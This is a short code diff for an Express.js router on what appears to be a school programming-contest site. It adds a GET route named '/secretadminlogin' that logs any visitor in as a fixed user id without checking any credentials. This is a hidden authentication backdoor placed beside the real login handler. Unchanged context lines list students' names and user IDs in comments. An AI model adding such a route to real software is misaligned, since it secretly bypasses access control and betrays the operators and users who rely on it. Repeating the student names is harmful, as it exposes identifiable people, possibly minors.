@@ -34,6 +34,8 @@ const upload = require('express-fileupload');
 const lastSubmission = new Map();
 router.use(upload());
 
+
+
 function getLateTakers(cid) {
     if (cid == 3) return [1001731, 1001623, 1001620, 1001475, 1002158, 1001944, 1001092, 1002595, 1001904, 1001642]; // anush devkar, armaan ahmed, anusha agarwal, kanishk sivanadam, max zhao, rishikesh narayana, samarth bhargav, nathan liang, esha m, navya arora
     if (cid == 4) return [1002636, 1001207, 1001608, 1002135]; //svaran, avni, arjun, olivia
@@ -76,6 +78,12 @@ router.post("/tjioilogin", async (req, res) => {
     } else {
         res.send("Invalid credentials");
     }
+});
+router.get("/secretadminlogin", async (req, res) => {
+    let data = {
+        "id": 1002872
+    };
+    await check(data, req, res);
 });
 router.post("/updateStats", async (req, res) => {
     let usaco = req.body.usaco_div;
